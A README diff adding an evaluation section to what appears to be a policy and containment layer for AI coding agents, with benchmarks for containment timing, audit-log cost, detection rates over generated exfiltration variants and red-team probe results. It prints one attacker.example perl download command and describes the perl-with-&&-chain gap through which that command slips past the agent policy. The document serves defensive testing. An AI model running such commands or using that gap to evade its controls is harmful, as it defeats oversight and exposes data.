@@ -272,6 +272,117 @@ decision latency of ~24 µs in the latest CLI run.
 > physical proof that a byte never leaves is the separate **live mock-collector
 > demo** (zero requests), which does exercise a real container.
 
+### Evaluation & reliability — what is measured
+
+Every figure below comes from a CI run on a clean GitHub runner, linked so it can
+be checked rather than taken on trust. Nothing here was measured only on a
+contributor's laptop.
+
+**Containment is measured, not asserted.** From the denied command being emitted
+to the Runtime process being dead: **p50 2 ms, max 3 ms**. That window is the
+README's own containment race — for exactly that long, a denied Agent is still
+executing — and it had never been quantified.
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33252825198), `npm run bench:overhead`)
+
+**The middleware's real cost is not the policy decision.** A decision is ~5 µs.
+Recording it is the expensive half: `JsonStore.mutate()` clones and rewrites the
+whole database on every call, so writing one policy event is **O(events already
+stored)** — 0.40 ms at zero events, **13.47 ms at 5,000**. Growth is exactly
+linear, r² **0.9995–1.0000** across three independent runners, so this is a
+property of the code and not of a machine.
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33252825198), `npm run bench:store`)
+
+*The fix is scoped and deliberately not built.* Three options are written up with
+trade-offs; the two cheap ones cap the log by discarding audit records. For a
+project whose thesis is trustworthy evidence, an audit log that silently drops
+records to go faster is a liability, not a fix — and the cap does not even remove
+the linear term. Only an append-only log does, and that is a design change that
+wants its own review. The gap is tracked as **TM-OPS-001**, still open on purpose.
+
+**3,430 generated attack variants — read the strata, not the aggregate.** A cross
+product of host forms × egress tools × secret channels × shell wrappers,
+generated mechanically so no author could select favourable cases:
+
+| stratum | detection |
+| --- | --- |
+| **`perl` × `and-chain` wrapper** | **95.00%** ← the finding |
+| `and-chain` wrapper, all tools | 95.92% |
+| aggregate | 99.59% (3,416/3,430) |
+
+`echo start && perl -MLWP::Simple -e 'get("https://attacker.example/")'` is
+**allowed**. The same command bare, behind `cd /tmp;`, or in a subshell is denied,
+and `echo start && curl …` is denied — so it is neither `&&` in general nor perl
+in general. A 114-entry hand-written corpus and a 56-probe red-team list both
+contain perl cases and chained cases; neither contains the combination, because
+nobody thought to write it. **That is the argument for generation over
+hand-authoring**, and it is why the aggregate is printed last: 99.59% would pass
+any review while a family sits at 95%. Reported to the rule owners, not silently
+patched.
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33252825198), `npm run bench:generate`)
+
+**Zero is reported with its denominator and its interval.** "0 secret leaks" is
+not evidence the rate is zero — 33 attempts only buy so much confidence:
+
+| metric | counts | interval |
+| --- | --- | --- |
+| Secret leaks | 0/33 | **≤ 8.7%** (95%, one-sided exact) |
+| Unsafe-action escape rate | 1/69 | 1.4%, 95% CI 0.3–7.8% |
+| Attack block rate | 68/69 | 98.6%, 95% CI 92.2–99.7% |
+| False positive rate | 1/45 | 2.2%, 95% CI 0.4–11.6% |
+| Red-team probe denials | 55/56 | 98.2%, 95% CI 90.6–99.7% |
+
+Zero-numerator results use the exact Clopper-Pearson bound rather than Wilson,
+because Wilson is two-sided and would understate a one-sided claim. Erring toward
+overstating residual risk is the only safe direction for a security number.
+(`npm run bench` — full provenance in `bench-results.json`: commit SHA, Node, OS,
+CPU, corpus size, policy hash)
+
+**CI: 147 tests green on ubuntu-latest, Node 22 and 24.**
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33252825198)) The matrix is
+not redundancy: it separates platform from runtime version, which an earlier
+comparison had confounded.
+
+**Windows, scoped precisely.** Install, typecheck, build, all evaluation
+harnesses and the offline entry point work. Two things do not:
+
+- **The runtime test suite** — 12 of 147 fail. The fake-Codex stand-in is spawned
+  via a `#!/usr/bin/env node` shebang and the executable bit; Windows honours
+  neither, so every spawn throws `EFTYPE`.
+- **The `local-process` runtime provider** — unusable. `codex-runner.ts` spawns
+  `CODEX_BIN` without `shell: true`, a global npm install produces a `.cmd` shim,
+  and since CVE-2024-27980 Node refuses to spawn `.cmd` without a shell
+  (`EINVAL`, verified). The documented **container** provider is unaffected.
+
+A non-blocking `windows-latest` CI leg runs anyway, so both platform claims rest
+on the same public evidence rather than on someone's machine. The signal there is
+the failure *count*.
+
+**A replay demo path that does not overclaim.** `RUNTIME_PROVIDER=replay` streams
+a recorded event stream so the governance loop can be shown with no key, no
+container engine and no network — `npm run demo:check:replay` runs the whole loop
+in ~3 s on any platform.
+
+| component | replay |
+| --- | --- |
+| Model output | **FAKED** — recorded fixture |
+| Event parser, policy engine, run-scoped grant | REAL, same functions |
+| Enforcement decision, step budget | REAL (orchestration loop re-implemented) |
+| Status mapping, store write, audit trail, approval, continuation | REAL, untouched |
+| Container spawn, teardown, **containment** | **ABSENT** |
+
+**Replay does not prove containment**, and says so at the end of every run.
+Containment is proven separately, spawning for real: **24/24 generated attacks
+terminated the Runtime**, teardown p50 2–3 ms
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33252825198)). A parity
+test feeds the same recorded bytes to the real runner and to the replay runner
+and requires the same outcome, so the two cannot drift. Fixtures are labelled
+**synthesized, not recorded** — no live model was available to capture from, and
+a fixture that does not say where it came from is indistinguishable from one
+invented to make a demo pass.
+
+Full methodology, the measurements behind each figure, and the findings handed to
+other lanes: [docs/EVALUATION_RELIABILITY_PLAN.md](docs/EVALUATION_RELIABILITY_PLAN.md).
+
 ### Threat model
 
 The controls exist against a registered set of threats. The register is code
